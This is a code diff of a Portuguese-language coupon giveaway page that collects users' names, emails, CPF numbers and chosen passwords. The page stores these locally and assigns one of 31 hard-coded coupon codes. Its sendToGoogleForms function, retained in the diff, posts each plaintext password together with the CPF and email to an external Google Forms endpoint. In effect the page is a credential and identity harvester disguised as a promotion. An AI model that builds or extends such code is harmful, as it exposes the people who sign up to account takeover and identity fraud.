@@ -1,8 +1,5 @@
 
 
-
-
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -341,8 +338,7 @@
             const recoveryMessage = document.getElementById('recovery-message'); 
             
             // =======================================================================================
-            // 🚨 CONFIGURAÇÃO OBRIGATÓRIA DO GOOGLE FORMS (ATUALIZADA)
-            // Os IDs foram mapeados para o seu novo formulário.
+            // 🚨 CONFIGURAÇÃO OBRIGATÓRIA DO GOOGLE FORMS 
             // =======================================================================================
             const FORM_ACTION_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSd5kqX1HuvNnQwKCknXcsbmy2DEdon7jsGAQtzyvzRr0aLojQ/formResponse'; 
             const NAME_FIELD_GF = 'entry.2009915093';   
@@ -366,41 +362,41 @@
             const COUPON_INDEX_KEY = 'nuance_coupon_index';
             const SHUFFLED_COUPONS_KEY = 'nuance_shuffled_coupons'; 
 
+           // LISTA ORIGINAL COM 31 CUPONS (confirmado)
            const BASE_COUPONS = [
-	"NUANCE_B8C95RF6",
-	"NUANCE_87SBYS1Y",
-	"NUANCE_C0Z7P90C",
-	"NUANCE_4LUJ96PK",
-	"NUANCE_K616LW2F",
-	"NUANCE_HHLCOA8A",
-	"NUANCE_KFFXW1QE",
-	"NUANCE_65TZMONP",
-	"NUANCE_OT73KSFJ",
-	"NUANCE_3SLC9FSW",
-	"NUANCE_W4E9EFE2",
-	"NUANCE_N27EIGZE",
-	"NUANCE_NV3ZC6B5",
-	"NUANCE_FM3YMBRA",
-	"NUANCE_0IL5PJG8",
-	"NUANCE_E1H1HRLD",
-	"NUANCE_SZGYVUZM",
-	"NUANCE_HBQUR22D",
-	"NUANCE_1QDXZ4JI",
-	"NUANCE_REXWJN4Z",
-	"NUANCE_S28L86CN",
-	"NUANCE_M9L5195D",
-	"NUANCE_B5YDBMR9",
-	"NUANCE_RVVH9R38",
-	"NUANCE_74ZIABOT",
-	"NUANCE_62BXST36",
-	"NUANCE_9VWLJ5L5",
-	"NUANCE_9WQJ7LY5",
-	"NUANCE_R9IC4810",
-	"NUANCE_PBID3BP1",
-	"NUANCE_5SL6Y6G1",
-    "NUANCE_34H3OFF5",
-	"NUANCE_238DKV46"
-];
+                "NUANCE_B8C95RF6",
+                "NUANCE_87SBYS1Y",
+                "NUANCE_C0Z7P90C",
+                "NUANCE_4LUJ96PK",
+                "NUANCE_K616LW2F",
+                "NUANCE_HHLCOA8A",
+                "NUANCE_KFFXW1QE",
+                "NUANCE_65TZMONP",
+                "NUANCE_OT73KSFJ",
+                "NUANCE_3SLC9FSW",
+                "NUANCE_W4E9EFE2",
+                "NUANCE_N27EIGZE",
+                "NUANCE_NV3ZC6B5",
+                "NUANCE_FM3YMBRA",
+                "NUANCE_0IL5PJG8",
+                "NUANCE_E1H1HRLD",
+                "NUANCE_SZGYVUZM",
+                "NUANCE_HBQUR22D",
+                "NUANCE_1QDXZ4JI",
+                "NUANCE_REXWJN4Z",
+                "NUANCE_S28L86CN",
+                "NUANCE_M9L5195D",
+                "NUANCE_B5YDBMR9",
+                "NUANCE_RVVH9R38",
+                "NUANCE_74ZIABOT",
+                "NUANCE_62BXST36",
+                "NUANCE_9VWLJ5L5",
+                "NUANCE_9WQJ7LY5",
+                "NUANCE_R9IC4810",
+                "NUANCE_PBID3BP1",
+                "NUANCE_5SL6Y6G1" // Total de 31 cupons
+            ];
+            const EXPECTED_COUPON_COUNT = 31; // Novo constante para o número esperado de cupons
             
             // --- FUNÇÃO DE VALIDAÇÃO DE CPF ---
             function isValidCPF(cpf) {
@@ -451,13 +447,21 @@
 
             function getNextCoupon() {
                 const shuffledCouponsString = localStorage.getItem(SHUFFLED_COUPONS_KEY);
+                
+                // Força a inicialização se não houver dados, garantindo que o sistema de cupons esteja pronto.
                 if (!shuffledCouponsString) {
-                    initializeCouponSystem();
+                    initializeCouponSystem(true); // Chamada forçada
                     return getNextCoupon(); 
                 }
+                
                 const SHUFFLED_COUPONS = JSON.parse(shuffledCouponsString);
+                
+                // Se a lista estiver vazia (erro grave), retorna um fallback
+                if(SHUFFLED_COUPONS.length === 0) return "ERRO_CUPOM_VAZIO"; 
+                
                 let currentIndex = parseInt(localStorage.getItem(COUPON_INDEX_KEY) || '-1');
                 let nextIndex = (currentIndex + 1) % SHUFFLED_COUPONS.length;
+                
                 const coupon = SHUFFLED_COUPONS[nextIndex];
                 localStorage.setItem(COUPON_INDEX_KEY, nextIndex.toString());
                 return coupon;
@@ -500,13 +504,13 @@
                 return localStorage.getItem(STORAGE_KEY_COUPON) || 'N/A';
             }
 
-            // --- FUNÇÃO ATUALIZADA PARA ENVIAR TAMBÉM A SENHA ---
+            // --- FUNÇÃO DE ENVIO ---
             async function sendToGoogleForms(name, email, cpf, password) { 
                 const formData = new FormData();
                 formData.append(NAME_FIELD_GF, name);
                 formData.append(EMAIL_FIELD_GF, email);
                 formData.append(CPF_FIELD_GF, cpf);
-                formData.append(PASSWORD_FIELD_GF, password); // Adiciona a senha!
+                formData.append(PASSWORD_FIELD_GF, password); 
 
                 try {
                     const response = await fetch(FORM_ACTION_URL, {
@@ -546,8 +550,6 @@
                 cardDiv.classList.add('hidden');
                 couponDiv.classList.remove('hidden');
             }
-            // --- FIM FUNÇÕES DE CUPOM E STORAGE ---
-
 
             // --- LÓGICA DE RECUPERAÇÃO DE SENHA ---
             function handleForgotPassword() {
@@ -597,7 +599,7 @@
                 const loginFeedback = document.getElementById('login-feedback-message');
                 if (loginFeedback) loginFeedback.classList.add('hidden');
                 
-                cardDiv.classList.add('hidden'); // Esconde o cartão de dados
+                cardDiv.classList.add('hidden'); 
             }
 
             backToLoginLink.addEventListener('click', (e) => {
@@ -705,13 +707,14 @@
                 
                 submitButton.textContent = 'Gerando Cupom...';
                 
-                // --- AQUI GERAMOS E SALVAMOS O CUPOM NO LOCALSTORAGE ---
+                // --- GARANTE QUE O SISTEMA DE CUPONS ESTEJA CORRETO E SELECIONA O PRÓXIMO CUPOM DA SUA LISTA ---
+                initializeCouponSystem(); // Garante que a lista de 31 cupons esteja no storage
                 const newCoupon = getNextCoupon();
+                
                 saveClientData(name, email, newPassword, rawCpf, newCoupon);
                 
                 submitButton.textContent = 'Enviando Dados...';
 
-                // --- CHAMADA ATUALIZADA ENVIANDO A SENHA ---
                 await sendToGoogleForms(name, email, rawCpf, newPassword);
                 
                 displayCoupon(name, newCoupon);
@@ -724,23 +727,38 @@
             });
 
             // --- FUNÇÃO DE INICIALIZAÇÃO DO SISTEMA DE CUPONS ---
-            function initializeCouponSystem() {
+            function initializeCouponSystem(force = false) {
                 let shuffledCoupons = localStorage.getItem(SHUFFLED_COUPONS_KEY);
-                
-                if (BASE_COUPONS.length !== 32) {
-                    console.error("ERRO GRAVE: A lista BASE_COUPONS DEVE CONTER EXATAMENTE 32 ITENS.");
+                let currentShuffledList = null;
+
+                // 1. Verifica se existe uma lista salva
+                if (shuffledCoupons) {
+                    try {
+                        currentShuffledList = JSON.parse(shuffledCoupons);
+                    } catch (e) {
+                        console.error("Erro ao parsear lista de cupons embaralhados.");
+                        currentShuffledList = null;
+                    }
                 }
 
-                if (!shuffledCoupons) {
+                // 2. Decide se precisa inicializar/re-inicializar (se não existir, se o tamanho estiver errado, ou se for forçado)
+                if (force || !currentShuffledList || currentShuffledList.length !== EXPECTED_COUPON_COUNT) {
+                    if (!currentShuffledList || currentShuffledList.length !== EXPECTED_COUPON_COUNT) {
+                        console.warn(`Aviso: Re-inicializando a lista de cupons. O tamanho atual (${currentShuffledList ? currentShuffledList.length : 0}) não corresponde ao esperado (${EXPECTED_COUPON_COUNT}).`);
+                    } else if (force) {
+                        console.log("Forçando re-inicialização do sistema de cupons.");
+                    }
+
                     const newShuffledList = shuffleArray(BASE_COUPONS);
                     localStorage.setItem(SHUFFLED_COUPONS_KEY, JSON.stringify(newShuffledList));
-                    localStorage.setItem(COUPON_INDEX_KEY, '-1');
+                    localStorage.setItem(COUPON_INDEX_KEY, '-1'); // Reinicia o índice
                 }
             }
 
 
             // 3. Inicialização Principal
             function initialize() {
+                // Garante que o sistema de cupons esteja pronto (e limpo de versões antigas)
                 initializeCouponSystem(); 
                 
                 const clientData = getClientData();
